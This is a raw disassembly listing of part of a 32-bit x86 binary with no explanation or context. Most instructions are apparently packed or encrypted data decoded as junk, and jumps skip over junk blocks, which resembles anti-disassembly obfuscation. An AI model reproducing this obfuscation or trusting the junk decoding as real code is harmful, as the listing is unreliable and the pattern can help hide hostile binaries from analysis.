  4051ae:	ins    DWORD PTR es:[edi],dx
  4051af:	adc    dh,bl
  4051b1:	int    0xdc
  4051b3:	fsub   QWORD PTR [edi]
  4051b5:	cmp    eax,0xa1946f42
  4051ba:	retf   0xd284
  4051bd:	loope  0x4051d6
  4051bf:	jb     0x405178
  4051c1:	inc    eax
  4051c2:	mov    ebx,DWORD PTR [esi+0x72f113c0]
  4051c8:	sahf   
  4051c9:	repz adc DWORD PTR [ebx+0x11f46c12],edi
  4051d0:	hlt    
  4051d1:	pop    edi
  4051d2:	sub    DWORD PTR [edx-0x7f957fb7],ecx
  4051d8:	or     al,0x1a
  4051da:	pop    ebp
  4051db:	xor    al,0x12
  4051dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4051de:	xchg   DWORD PTR [esi+0x1882813],ebp
  4051e4:	dec    edx
  4051e5:	mov    ds:0xbefce225,al
  4051ea:	xchg   BYTE PTR [ebx+0x8bb64b4],bl
  4051f0:	loop   0x405264
  4051f2:	add    bl,BYTE PTR [edi+ecx*1-0x3c]
  4051f6:	jbe    0x4051e5
  4051f8:	ret    0xa5f6
  4051fb:	mov    edx,0x58dfd1b1
  405200:	fidivr WORD PTR [edx]
  405202:	lahf   
  405203:	pop    esi
  405204:	(bad)  
  405206:	stc    
  405207:	mov    ebx,0xbccb875f
  40520c:	push   es
  40520d:	pop    esi
  40520e:	push   0x53
  405210:	outs   dx,BYTE PTR ds:[esi]
  405211:	sub    DWORD PTR [eax-0x373aa3a2],ebx
  405217:	dec    edi
  405218:	es test al,0x1b
  40521b:	mov    WORD PTR [ebx],cs
  40521d:	fild   QWORD PTR [esi-0x6137cacb]
  405223:	inc    edi
  405224:	jno    0x40521a
  405226:	scas   eax,DWORD PTR es:[edi]
  405227:	jbe    0x40529c
  405229:	push   cs
  40522a:	mov    bh,0x3a
  40522c:	cmp    edi,DWORD PTR [ecx]
  40522e:	cmovae ecx,DWORD PTR [edx-0x2f]
  405232:	(bad)  
  405233:	pop    eax
  405234:	in     al,dx
  405235:	fdivp  st(6),st
  405237:	jno    0x405203
  405239:	ficomp DWORD PTR [edx]
  40523b:	mov    DWORD PTR [ebp+0xc],eax
  40523e:	mov    eax,DWORD PTR [ebp-0x4]
  405241:	mov    esi,DWORD PTR [ebp-0x8]
  405244:	xor    eax,edx
  405246:	xor    esi,edx
  405248:	add    eax,ecx
  40524a:	add    esi,ecx
  40524c:	imul   eax,esi
  40524f:	mov    esi,DWORD PTR [ebp+0xc]
  405252:	cmp    esi,eax
  405254:	mov    eax,DWORD PTR [ebp-0x4]
  405257:	je     0x405025
  40525d:	xor    eax,edx
  40525f:	add    eax,ecx
  405261:	mov    ecx,DWORD PTR [ebp+0xc]
  405264:	imul   eax,ecx
  405267:	add    eax,DWORD PTR [ebp+0x8]
  40526a:	mov    DWORD PTR [ebp+0xc],eax
  40526d:	mov    eax,DWORD PTR [ebp+0xc]
  405270:	pop    esi
  405271:	leave  
  405272:	ret    0x8
  405275:	push   ebp
  405276:	mov    ebp,esp
  405278:	push   ecx
  405279:	jmp    0x4055dc
  40527e:	sahf   
  40527f:	jb     0x40520d
  405281:	push   edx
  405282:	pop    esp
  405283:	jl     0x4052ed
  405285:	jb     0x405286
  405287:	ret    
  405288:	mov    ebx,0x2daef139
  40528d:	aam    0x5b
  40528f:	sub    bh,BYTE PTR [esi+0x7e]
  405292:	les    edi,FWORD PTR [ecx+0x7e]
  405295:	jle    0x40525d
  405297:	sbb    ebx,eax
  405299:	push   0x4faf96a0
  40529e:	add    BYTE PTR [ebx],bl
  4052a0:	inc    ecx
  4052a1:	push   ebx
  4052a2:	jb     0x405236
  4052a4:	sbb    ch,al
  4052a6:	je     0x405277
  4052a8:	jo     0x4052fa
  4052aa:	mov    dh,BYTE PTR [edi]
  4052ac:	xchg   bl,dl
  4052ae:	jmp    0xf47c23a
  4052b3:	push   edi
  4052b4:	enter  0x4ba0,0x6d
  4052b8:	mov    DWORD PTR [ecx+0x3ee1b000],esp
  4052be:	stos   DWORD PTR es:[edi],eax
  4052bf:	pop    ebp
  4052c0:	pop    ss
  4052c1:	sub    BYTE PTR [ebx+0x5b477f6f],0xcb
  4052c8:	mov    al,0x35
  4052ca:	push   edi
  4052cb:	inc    eax
  4052cc:	ds popf 
  4052ce:	mov    esi,0x3eccba0a
  4052d3:	out    dx,eax
  4052d4:	aad    0xfc
  4052d6:	cmp    bh,dl
  4052d8:	sub    ah,ch
  4052da:	jmp    0x77beb08e
  4052df:	(bad)  
  4052e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4052e1:	mov    eax,ds:0x14623a21
  4052e6:	jge    0x4052e9
  4052e8:	dec    edx
  4052e9:	(bad)  
  4052eb:	xor    esp,DWORD PTR [ebx-0x3f]
  4052ee:	rcl    esp,1
  4052f0:	jne    0x40534c
  4052f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4052f3:	test   BYTE PTR [esi],ch
  4052f5:	std    
  4052f6:	push   edi
  4052f7:	mov    BYTE PTR [eax],bl
  4052f9:	mov    cl,0x96
  4052fb:	xlat   BYTE PTR ds:[ebx]
  4052fc:	or     edi,DWORD PTR [edi-0x55]
  4052ff:	out    dx,al
  405300:	test   al,0xca
  405302:	fs out 0x28,eax
  405305:	scas   al,BYTE PTR es:[edi]
  405306:	mov    esi,0xb4f300d7
  40530b:	push   esp
  40530c:	ror    esi,cl
  40530e:	pop    ebp
  40530f:	push   cs
  405310:	lods   eax,DWORD PTR ds:[esi]
  405311:	xor    al,0x6f
  405313:	mov    WORD PTR [ecx+0x6e],ss
  405316:	fsub   QWORD PTR [esi-0x41f2a523]
  40531c:	call   0x738f8e3d
  405321:	push   eax
  405322:	and    al,0xa3
  405324:	mov    eax,DWORD PTR [edx+0xf]
  405327:	dec    edx
  405328:	(bad)  
  405329:	test   al,0x6e
  40532b:	cwde   
  40532c:	adc    DWORD PTR [eax+0x79a230f1],ecx
  405332:	inc    esp
  405333:	mov    bh,BYTE PTR ds:[eax-0x5d]
  405337:	in     al,0x6e
  405339:	push   esp
  40533a:	xor    cl,bh
  40533c:	aas    
  40533d:	push   es
  40533e:	jb     0x4052ee
  405340:	mov    esp,0x713702b3
  405345:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405346:	inc    esp
  405347:	test   bh,bh
  405349:	xor    al,0xa2
  40534b:	mov    esi,0xeeacd3ab
  405350:	stos   DWORD PTR es:[edi],eax
  405351:	aam    0x7c
  405353:	je     0x4053ae
  405355:	push   0x1c1850e7
  40535a:	ins    BYTE PTR es:[edi],dx
  40535b:	mov    edx,es
  40535d:	addr16 test eax,0xac43cf98
  405363:	jge    0x4053b3
  405365:	in     al,dx
  405366:	icebp  
  405367:	stc    
  405368:	sbb    dl,BYTE PTR [ebp-0x75]
  40536b:	pop    ds
  40536c:	outs   dx,BYTE PTR ds:[esi]
  40536d:	mov    bl,0xdc
  40536f:	clc    
  405370:	repnz sbb al,0xb8
  405373:	inc    ebp
  405374:	daa    
  405375:	loop   0x405334
  405377:	add    eax,eax
  405379:	outs   dx,BYTE PTR ds:[esi]
  40537a:	cmp    DWORD PTR [edi],edi
  40537c:	aam    0xcc
  40537e:	jae    0x405351
  405380:	inc    ebx
  405381:	addr16 add eax,0x6f8d9898
  405387:	cmp    ebx,esi
  405389:	scas   eax,DWORD PTR es:[edi]
  40538a:	fadd   QWORD PTR [eax]
  40538c:	sub    bl,ah
  40538e:	ret    
  40538f:	sbb    eax,edx
  405391:	pop    ss
  405392:	into   
  405393:	push   esi
  405394:	cwde   
  405395:	pop    edx
  405396:	push   eax
  405397:	cmp    BYTE PTR [ebp-0x46],cl
  40539a:	xor    DWORD PTR [edi+0x5f],0xfffffff0
  40539e:	sbb    eax,esi
  4053a0:	push   ss
  4053a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4053a2:	and    BYTE PTR [esi+0x68],dl
  4053a5:	aas    
  4053a6:	div    esi
  4053a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4053a9:	outs   dx,BYTE PTR ds:[esi]
  4053aa:	scas   al,BYTE PTR es:[edi]
  4053ab:	dec    ebp
  4053ac:	or     BYTE PTR [edi-0x2b8b8f7d],0xa6
  4053b3:	inc    edi
  4053b4:	sub    bl,ch
  4053b6:	retf   0x3d5e
  4053b9:	xchg   esp,eax
  4053ba:	push   ebx
  4053bb:	sub    cl,BYTE PTR [esp+ebx*4]
  4053be:	test   al,0x9f
  4053c0:	pushf  
  4053c1:	push   0xd17c470b
  4053c6:	cmp    BYTE PTR [eax+ebx*2],dh
  4053c9:	jmp    FWORD PTR [esi]
  4053cb:	gs pop ebx
  4053cd:	in     al,dx
  4053ce:	sub    bh,BYTE PTR [edx+0x401c0a40]
  4053d4:	cmp    dl,cl
  4053d6:	popa   
  4053d7:	sti    
  4053d8:	out    0xb4,al
  4053da:	daa    
  4053db:	mov    cl,0xef
  4053dd:	lock jbe 0x405367
  4053e0:	cmp    dl,0xf2
  4053e3:	push   cs
  4053e4:	and    BYTE PTR [eax+eiz*4+0x4258f10a],ah
  4053eb:	adc    eax,0x6d04d532
  4053f0:	dec    edi
  4053f1:	xor    eax,DWORD PTR [edi-0xd7c777c]
  4053f7:	xchg   BYTE PTR [edx-0x7b59286a],ch
  4053fd:	xchg   esi,eax
  4053fe:	jg     0x405384
  405400:	add    DWORD PTR [ebx-0x78d7298c],ebp
  405406:	push   cs
  405407:	clc    
  405408:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405409:	mov    bh,0xe2
  40540b:	mov    dh,0x14
  40540d:	loop   0x4053f6
  40540f:	sub    al,0x1d
  405411:	inc    BYTE PTR [edx]
  405413:	jne    0x405467
  405415:	popf   
  405416:	mov    BYTE PTR [esp+esi*8-0x39],bl
  40541a:	sbb    BYTE PTR [edi+eiz*2],0x5f
  40541e:	lock ins BYTE PTR es:[edi],dx
  405420:	mov    cs,ebx
  405422:	test   al,0xdd
  405424:	and    DWORD PTR [ecx+ecx*2-0x181ea00e],esi
  40542b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40542c:	or     DWORD PTR [eax+0x7293bb4e],ebp
  405432:	loope  0x40549a
  405434:	jge    0x405472
  405436:	cmp    DWORD PTR [ebp-0x54],ebx
  405439:	test   al,0x42
  40543b:	aaa    
  40543c:	mov    ds:0x7f088104,eax
  405441:	test   DWORD PTR [edx],ebp
  405443:	sub    BYTE PTR [eax+0x574333a8],al
  405449:	sbb    BYTE PTR [edi+0x1],al
  40544c:	adc    bl,BYTE PTR [ecx]
  40544e:	pop    edx
  40544f:	pop    ebx
  405450:	inc    ecx
  405451:	xchg   ecx,eax
  405452:	(bad)  
  405454:	(bad)  
  405455:	jl     0x405438
  405457:	and    eax,0xb9f2d7a5
  40545c:	outs   dx,BYTE PTR fs:[esi]
  40545e:	xor    al,0x2a
  405460:	mov    bh,0xe3
  405462:	inc    ebx
  405463:	rol    BYTE PTR [bp+si],0xfe
  405467:	adc    eax,0x1d33c0fe
  40546c:	xchg   esp,eax
  40546d:	xchg   al,dh
  40546f:	imul   edi,ecx,0x1ae17a16
  405475:	test   al,0xff
  405477:	imul   edx,ecx,0xffffff97
  40547a:	pop    ebp
  40547b:	push   esp
  40547c:	fdiv   DWORD PTR [edx+0x65093231]
  405482:	sbb    BYTE PTR [ecx],dl
  405484:	lds    edx,FWORD PTR [edx-0x2323d5f1]
  40548a:	jbe    0x405454
  40548c:	(bad)  
  40548d:	aam    0xbf
  40548f:	scas   eax,DWORD PTR es:[edi]
  405490:	shl    ecx,cl
  405492:	sar    BYTE PTR [esi],0x46
  405495:	(bad)
  405499:	test   al,0x19
  40549b:	inc    ebx
  40549c:	sub    ch,BYTE PTR [ebp-0x2106ce4d]
  4054a2:	popa   
  4054a3:	mov    esp,0x562c6b1a
  4054a8:	inc    ebx
  4054a9:	add    DWORD PTR [edx-0x48],ecx
  4054ac:	leave  
  4054ad:	pop    es
  4054ae:	add    ch,bh
  4054b0:	push   esi
  4054b1:	fdivr  DWORD PTR [esi+0x35]
  4054b4:	div    DWORD PTR [ebp-0x4813edb0]
  4054ba:	dec    edi
  4054bb:	mov    esi,0xb0476a4d
  4054c0:	sub    eax,0x6e06e18f
  4054c5:	and    DWORD PTR ds:0x8ff856d8,0x91889fc2
  4054cf:	out    dx,al
  4054d0:	(bad)  
  4054d1:	pop    ebx
  4054d2:	adc    al,0x46
  4054d4:	cmc    
  4054d5:	adc    DWORD PTR [ebp+0x45],edi
  4054d8:	rol    dh,0x68
  4054db:	or     ecx,edx
  4054dd:	out    dx,eax
  4054de:	mov    ?,WORD PTR gs:[edi-0x5c]
  4054e2:	push   esp
  4054e3:	lock inc edi
  4054e5:	mov    ebx,0x7c0bbb95
  4054ea:	pop    ds
  4054eb:	out    0x7a,eax
  4054ed:	retf   0x2c77
  4054f0:	pushf  
  4054f1:	jl     0x40554e
  4054f3:	dec    esp
  4054f4:	mov    esp,0x5e041c4d
  4054f9:	sub    al,0x32
  4054fb:	nop
  4054fc:	das    
  4054fd:	repz dec esi
  4054ff:	sahf   
  405500:	pusha  
  405501:	fidiv  DWORD PTR [eax+0x5c]
  405504:	pop    ebx
  405505:	xor    eax,0xf96d018e
  40550a:	inc    ebx
  40550b:	test   al,0x5c
  40550d:	cs or  al,0x69
  405510:	lods   eax,DWORD PTR ds:[esi]
  405511:	ror    DWORD PTR [esi-0x60720b5],1
  405517:	mov    ch,al
  405519:	in     eax,dx
  40551a:	es push esi
  40551c:	sbb    DWORD PTR cs:[eax-0x4a],eax
  405520:	inc    esp
  405521:	cmp    al,0xc5
  405523:	das    
  405524:	in     al,dx
  405525:	aad    0xab
  405527:	adc    al,al
  405529:	pop    es
  40552a:	mov    esp,0xcbc86a70
  40552f:	pop    ebx
  405530:	call   0xb76f38
  405535:	out    0xe5,eax
  405537:	repz add eax,0x96e622c9
  40553d:	call   0xa3ca:0x9a232744
  405544:	adc    dl,ah
  405546:	call   0x84594203
  40554b:	sub    al,0xb3
  40554d:	jmp    0x40557f
  40554f:	rcr    ebp,0xb3
  405552:	ficomp WORD PTR [edx+0x4a728140]
  405558:	fwait
  405559:	xor    DWORD PTR [ebx+edx*4-0xa0852f6],ebp
  405560:	es ret 
  405562:	and    eax,0xcdd8c3c7
  405567:	inc    ebp
  405568:	push   edx
  405569:	mov    bh,0xbd
  40556b:	mov    WORD PTR [ebp+0x386e830d],ds
  405571:	sub    al,BYTE PTR [ecx-0x66]
  405574:	bound  ebp,QWORD PTR [esi-0x10404539]
  40557a:	ins    DWORD PTR es:[edi],dx
  40557b:	sbb    dl,ah
  40557d:	push   edi
  40557e:	lods   eax,DWORD PTR ds:[esi]
  40557f:	push   es
  405580:	test   eax,0x5e8e9a70
  405585:	cli    
  405586:	bound  ebp,QWORD PTR [edx+eax*2+0x9]
  40558a:	leave  
  40558b:	in     al,0xd0
  40558d:	aas    
  40558e:	cmp    esp,DWORD PTR [ebp-0x6133f190]
  405594:	xchg   esi,eax
  405595:	mov    ds:0xa72f8a78,eax
  40559a:	(bad)  
  40559c:	aaa    
  40559d:	inc    edi
  40559e:	mov    ch,0xa6
  4055a0:	mov    bl,0xeb
  4055a2:	or     bl,BYTE PTR [edx+0x4a]
  4055a5:	push   ss
  4055a6:	xchg   edi,eax
  4055a7:	mov    edi,0xc0f4916b
  4055ac:	les    edx,FWORD PTR [esi-0x59]
  4055af:	cmc    
  4055b0:	arpl   WORD PTR [edx+0x21],cx
  4055b3:	push   ecx
  4055b4:	addr16 ds clc 
  4055b7:	push   esi
  4055b8:	or     edi,DWORD PTR [eax-0x58]
  4055bb:	jg     0x405600
  4055bd:	jmp    0x6803a324
  4055c2:	sbb    al,0x81
  4055c4:	pop    edi
  4055c5:	xor    cl,BYTE PTR [esi+0x69]
  4055c8:	mov    DWORD PTR [edx],ebp
  4055ca:	jg     0x4055b9
  4055cc:	and    eax,0x86e423b2
  4055d1:	ins    DWORD PTR es:[edi],dx
  4055d2:	xor    al,0x69
  4055d4:	push   ds
  4055d5:	bound  esi,QWORD PTR [edx]
  4055d7:	sbb    BYTE PTR [ebp-0x73],ch
  4055da:	sahf   
  4055db:	cld    
  4055dc:	push   ecx
  4055dd:	mov    eax,0x5a3fc9f
  4055e2:	mov    DWORD PTR [ebp-0x4],eax
  4055e5:	mov    DWORD PTR ds:0x434473,0x3619
  4055ef:	mov    ecx,DWORD PTR [ebp-0x4]
  4055f2:	jmp    0x405955
  4055f7:	xchg   esi,eax
  4055f8:	jb     0x405627
  4055fa:	jg     0x4055e9
  4055fc:	dec    ecx
  4055fd:	mov    esp,0x8b1aac73
  405602:	adc    ebp,DWORD PTR cs:[ebx+0x3621a8fd]
  405609:	jle    0x405689
  40560b:	les    edi,FWORD PTR [ecx+0x7e]
  40560e:	jle    0x4055a1
  405610:	outs   dx,BYTE PTR ds:[esi]
  405611:	push   cs
  405612:	shl    DWORD PTR [ebx],0x3f
  405615:	pop    ebx
  405616:	add    al,0x9a
  405618:	cld    
  405619:	popa   
  40561a:	xor    eax,0x14c0d27a
  40561f:	mov    bh,0x40
  405621:	mov    al,0x61
  405623:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405624:	dec    esi
  405625:	or     eax,0xcf7e2482
  40562a:	stos   BYTE PTR es:[edi],al
  40562b:	nop
  40562c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40562d:	push   es
  40562e:	jae    0x40569a
  405630:	push   ebx
  405631:	repz ret 
  405633:	push   cs
  405634:	xchg   edx,eax
  405635:	mov    ds:0xf59412f3,eax
  40563a:	(bad)  
  40563b:	std    
  40563c:	push   eax
  40563d:	jne    0x40561a
  40563f:	mov    ebp,ds
  405641:	push   ebp
  405642:	cmc    
  405643:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405644:	pusha  
  405645:	(bad)  
  405646:	fwait
  405647:	or     esp,esi
  405649:	mov    edi,0x3c24e5b3
  40564e:	std    
  40564f:	xchg   ebp,eax
  405650:	jno    0x40565d
  405652:	retf   
  405653:	fsub   st,st(6)
  405655:	or     eax,0x3a692dc6
  40565a:	or     cl,BYTE PTR [eax-0x1864b231]
  405660:	stos   DWORD PTR es:[edi],eax
  405661:	jnp    0x4055ec
  405663:	mov    cs,WORD PTR [edi+esi*2+0x4f]
  405667:	inc    eax
  405668:	mov    dl,0x2a
  40566a:	lods   al,BYTE PTR ds:[esi]
  40566b:	daa    
  40566c:	mov    eax,ds:0x2a6651c8
  405671:	add    DWORD PTR [esi+edi*4-0x42775842],esp
  405678:	ficomp DWORD PTR [ebx]
  40567a:	push   0x4d11a0a6
  40567f:	and    al,0x31
  405681:	jmp    FWORD PTR [eax]
  405683:	nop
  405684:	ss ja  0x4056de
  405687:	mov    ecx,ecx
  405689:	fs add al,0xcd
  40568d:	sub    BYTE PTR [ebx+0x7b127232],0x1e
  405694:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405695:	seto   BYTE PTR [edi+ebx*1-0xd]
  40569a:	out    0xe3,eax
  40569c:	adc    cl,0x18
  40569f:	cmc    
  4056a0:	adc    bh,BYTE PTR [edx]
  4056a2:	pop    ecx
  4056a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4056a4:	mov    al,ds:0xad8b8d32
  4056a9:	push   es
  4056aa:	mov    WORD PTR [eax],ss
  4056ac:	iret   
  4056ad:	fst    QWORD PTR [edx-0x2e0f3819]
  4056b3:	pop    esi
  4056b4:	jae    0x405713
  4056b6:	pop    ecx
  4056b7:	pop    eax
  4056b8:	(bad)  
  4056ba:	test   ebp,0xa912c9eb
  4056c0:	dec    esi
  4056c1:	mov    ?,ebp
  4056c3:	test   eax,0x6afb2c32
  4056c8:	jg     0x40572a
  4056ca:	xchg   ecx,eax
  4056cb:	and    al,0xab
  4056cd:	aaa    
  4056ce:	xchg   BYTE PTR [edx-0x32e35c32],cl
  4056d4:	and    bh,bh
  4056d6:	or     DWORD PTR [edx],ecx
  4056d8:	inc    eax
  4056d9:	xchg   DWORD PTR [edx-0x18],eax
  4056dc:	xchg   edi,eax
  4056dd:	push   ebx
  4056de:	adc    al,0xd
  4056e0:	lods   eax,DWORD PTR ds:[esi]
  4056e1:	dec    edi
  4056e2:	fldenv [ecx-0x65965b5e]
  4056e8:	shld   DWORD PTR [edi],ebp,0xc4
  4056ec:	int3   
  4056ed:	outs   dx,DWORD PTR ds:[esi]
  4056ee:	jge    0x40575c
  4056f0:	jecxz  0x405709
  4056f2:	lods   eax,DWORD PTR ds:[esi]
  4056f3:	test   eax,0xf67b0906
  4056f8:	cmp    dl,BYTE PTR [ebx+0x31]
  4056fb:	sti    
  4056fc:	xchg   esp,eax
  4056fd:	xor    eax,ecx
  4056ff:	adc    cl,BYTE PTR [ebx+0x3c412553]
  405705:	popa   
  405706:	xor    al,0xe
  405708:	add    dl,BYTE PTR [edx+0x3a9b051a]
  40570e:	cli    
  40570f:	xor    ch,bl
  405711:	pop    ebx
  405712:	int    0xf9
  405714:	dec    ecx
  405715:	cdq    
  405716:	fdivr  st,st(6)
  405718:	jmp    0x45f2:0x7f5748f1
  40571f:	sbb    dh,cl
  405721:	icebp  
  405722:	pop    ebp
  405723:	je     0x4056af
  405725:	test   eax,0x38b225a8
  40572a:	dec    ebp
  40572b:	push   0x54d0bc65
  405730:	mov    esi,0x34402f88
  405735:	or     al,0xc6
  405737:	mov    eax,ds:0x58ebcc05
  40573c:	sbb    BYTE PTR [esi-0x1ee558e7],dh
  405742:	push   ecx
  405743:	mov    dl,0xeb
  405745:	je     0x40577d
  405747:	sub    ch,ah
  405749:	(bad)  
  40574a:	out    0xd6,eax
  40574c:	ds loope 0x4056f2
  40574f:	and    cl,cl
  405751:	jle    0x40575c
  405753:	imul   ebp,edi,0x3e
  405756:	and    edi,esp
  405758:	jnp    0x405709
  40575a:	jl     0x4057b8
  40575c:	mov    cl,0x2e
  40575e:	stos   BYTE PTR es:[edi],al
  40575f:	out    dx,al
  405760:	jg     0x405727
  405762:	mov    al,ds:0x852a8253
  405767:	scas   al,BYTE PTR es:[edi]
  405768:	js     0x4057d1
  40576a:	jns    0x405782
  40576c:	sub    ecx,DWORD PTR [edi+esi*8+0x40dc08d7]
  405773:	mov    al,ds:0xf086a19
  405778:	aas    
  405779:	jns    0x40575e
  40577b:	sub    esi,eax
  40577d:	mov    BYTE PTR [edx],al
  40577f:	fnstsw WORD PTR [eiz*8+0x7b736240]
  405786:	fs loopne 0x405797
  405789:	dec    edi
  40578a:	(bad)  
  40578c:	or     eax,0x1a28a417
  405791:	jb     0x40575c
  405793:	sti    
  405794:	dec    ebp
  405795:	clc    
  405796:	pusha  
  405797:	inc    esi
  405798:	cmp    bl,BYTE PTR [ebp-0x4c]
  40579b:	test   BYTE PTR [eax],0x7a
  40579e:	jle    0x4057cb
  4057a0:	xor    al,0x8a
  4057a2:	xchg   BYTE PTR [ebx+ecx*2+0x6],ah
  4057a6:	push   ebp
  4057a7:	cmp    eax,0x9edb9930
  4057ac:	jne    0x40575f
  4057ae:	icebp  
  4057af:	pop    es
  4057b0:	loop   0x40578b
  4057b2:	push   esi
  4057b3:	test   DWORD PTR [eax+0xa5e5543],edx
  4057b9:	adc    esp,DWORD PTR [ecx+0x2847d7b2]
  4057bf:	or     al,0x27
  4057c1:	sub    eax,0x42fa4212
  4057c6:	out    dx,al
  4057c7:	cli    
  4057c8:	dec    edx
  4057c9:	(bad)  
  4057ca:	mov    bh,0x68
  4057cc:	inc    ecx
  4057cd:	dec    ecx
  4057ce:	pop    esi
  4057cf:	shl    BYTE PTR [esp+esi*8+0x6e],cl
  4057d3:	lds    esi,FWORD PTR ds:0xe538984e
  4057d9:	fistp  WORD PTR [eax+0x3db46210]
  4057df:	jmp    0x4057e9
  4057e1:	je     0x4057e1
  4057e3:	test   al,0x10
  4057e5:	ror    DWORD PTR [ebp-0x15],cl
  4057e8:	push   edi
  4057e9:	(bad)  
  4057ea:	mov    bh,0x20
  4057ec:	imul   edi,ebp,0x4f
  4057ef:	dec    BYTE PTR [esi+ebx*4+0x77]
  4057f3:	pop    ss
  4057f4:	sbb    DWORD PTR [eax+0x56],0x62
  4057f8:	(bad)  
  4057f9:	push   eax
  4057fa:	jge    0x405867
  4057fc:	mov    dh,BYTE PTR [edi+ebx*2-0x7f]
  405800:	sbb    DWORD PTR [ecx+0x70],edx
  405803:	jmp    0x8bb742f
  405808:	dec    ecx
  405809:	dec    ebp
  40580a:	ds mov al,0xd5
  40580d:	push   ss
  40580e:	mov    DWORD PTR [ebx],edi
  405810:	sub    DWORD PTR [edx+0x5],esi
  405813:	add    eax,ebp
  405815:	sub    DWORD PTR [ecx-0x71],0x86b2b01e
  40581c:	sti    
  40581d:	sub    al,0xbd
  40581f:	push   ebp
  405820:	pop    esp
  405821:	fs mov bh,0xbd
  405824:	add    ebx,DWORD PTR [ebp+0x21d15b13]
  40582a:	stos   BYTE PTR es:[edi],al
  40582b:	frstor [edi+ebx*8]
  40582e:	xchg   BYTE PTR [eax+edi*8-0x3e36df9],bh
  405835:	cmp    DWORD PTR [edi-0x7814c351],0xe2e332d9
  40583f:	mov    esp,0x687b51a
  405844:	mov    cl,BYTE PTR [ecx]
  405846:	fstp   QWORD PTR [ebx]
  405848:	mov    dh,0x51
  40584a:	sahf   
  40584b:	add    eax,0x35b4c1cb
  405850:	xchg   BYTE PTR cs:[edx],dl
  405853:	in     eax,dx
  405854:	fidivr WORD PTR [eax]
  405856:	or     eax,0xf1629298
  40585b:	mov    bl,0xf4
  40585d:	icebp  
  40585e:	mov    DWORD PTR [ebp-0x6b],edi
  405861:	ss out 0xde,al
  405864:	arpl   WORD PTR [edi+0x35],di
  405867:	fdiv   QWORD PTR [esi-0x798b93dc]
  40586d:	out    0xf,al
  40586f:	mov    eax,ds:0x82e7c578
  405874:	sbb    dl,BYTE PTR [esi]
  405876:	dec    eax
  405877:	push   0xae394b93
  40587c:	gs enter 0x7bc4,0x41
  405881:	imul   edx,DWORD PTR [eax],0x2c
  405884:	mov    bh,0x76
  405886:	js     0x4058ad
  405888:	push   ebp
  405889:	std    
  40588a:	fld    QWORD PTR [ecx+0xff771fd]
  405890:	(bad)  
  405891:	lock dec esi
  405893:	test   DWORD PTR [ebx-0x7c],0xab36bcaa
  40589a:	in     eax,0xfa
  40589c:	ins    BYTE PTR es:[edi],dx
  40589d:	sub    dl,BYTE PTR [edi]
  40589f:	and    eax,0xfbe1fb76
  4058a4:	jns    0x4058c1
  4058a6:	sbb    eax,0x6e51ae1d
  4058ab:	push   ecx
  4058ac:	jl     0x40585f
  4058ae:	add    BYTE PTR [ecx-0x68],dh
  4058b1:	push   ds
  4058b2:	call   0xa400:0xd6e1e28e
  4058b9:	xchg   edi,eax
  4058ba:	fsubr  QWORD PTR [esi]
  4058bc:	push   ss
  4058bd:	fadd   DWORD PTR [ebp+0x7260fbab]
  4058c3:	imul   eax,edx,0xdba9c056
  4058c9:	ds dec ecx
  4058cb:	mov    WORD PTR [esi-0x6f],?
  4058ce:	sbb    DWORD PTR [edx-0x722c73e6],ebx
  4058d4:	(bad)  
  4058d5:	jecxz  0x405874
  4058d7:	or     eax,0xac6237d8
  4058dc:	jae    0x4058d6
  4058de:	outs   dx,DWORD PTR ds:[esi]
  4058df:	adc    BYTE PTR [edx-0x35882a57],ch
  4058e5:	xchg   ebx,eax
  4058e6:	xor    ch,BYTE PTR [edi-0x2e]
  4058e9:	inc    esp
  4058ea:	and    DWORD PTR [ebx+0x3c9ba0bb],edi
  4058f0:	outs   dx,DWORD PTR ds:[esi]
  4058f1:	mov    dh,0xb1
  4058f3:	fiadd  DWORD PTR [eax-0x6b0e7694]
  4058f9:	inc    edi
  4058fa:	pop    edx
  4058fb:	shr    BYTE PTR [edi+ebp*8],1
  4058fe:	and    ch,BYTE PTR [edi]
  405900:	icebp  
  405901:	sub    al,0x7e
  405903:	daa    
  405904:	mov    DWORD PTR [eax-0x5316e47e],eax
  40590a:	push   ebx
  40590c:	imul   ecx,DWORD PTR [edi-0x39],0xffffffea
  405910:	out    0x33,al
  405912:	fisubr WORD PTR [ebp+0x373cc1ed]
  405918:	(bad)  
  405919:	pop    ds
  40591a:	rcl    DWORD PTR [esp+edi*2-0x5f],0x4c
  40591f:	imul   BYTE PTR [esi]
  405921:	shl    BYTE PTR [ebp+0xd40ae24],cl
  405927:	jno    0x405938
  405929:	test   al,0xf7
  40592b:	mov    bh,0xb8
  40592d:	push   es
  40592e:	cli    
  40592f:	sub    eax,0x2ddeef44
  405934:	outs   dx,DWORD PTR ds:[esi]
  405935:	or     eax,0xf0e40d4c
  40593a:	and    eax,0x7aa4dba1
  40593f:	popa   
  405940:	mov    dh,0x43
  405942:	les    esp,FWORD PTR [ebx-0x62312385]
  405948:	sub    al,0xf5
  40594a:	arpl   ax,bp
  40594c:	jecxz  0x405992
  40594e:	pop    esi
  40594f:	jl     0x4058fd
  405951:	inc    ebx
  405952:	xor    eax,edi
  405954:	push   0x39f845c7
  405959:	dec    edi
  40595a:	add    BYTE PTR [eax],al
  40595c:	mov    DWORD PTR ds:0x434553,0x224a
  405966:	jmp    0x405cc9
  40596b:	mov    edx,0x71b8a1ab
  405970:	pop    esp
  405971:	arpl   WORD PTR [ebp-0x4d872e44],si
  405977:	xor    esp,ebp
  405979:	inc    ecx
  40597a:	scas   al,BYTE PTR es:[edi]
  40597b:	out    dx,eax
  40597c:	xor    DWORD PTR [esi+0x7e],edi
  40597f:	les    edi,FWORD PTR [ecx+0x7e]
  405982:	jle    0x40592e
  405984:	and    DWORD PTR [edi*1+0x5e993501],ecx
  40598b:	xchg   ebp,eax
  40598c:	push   ebx
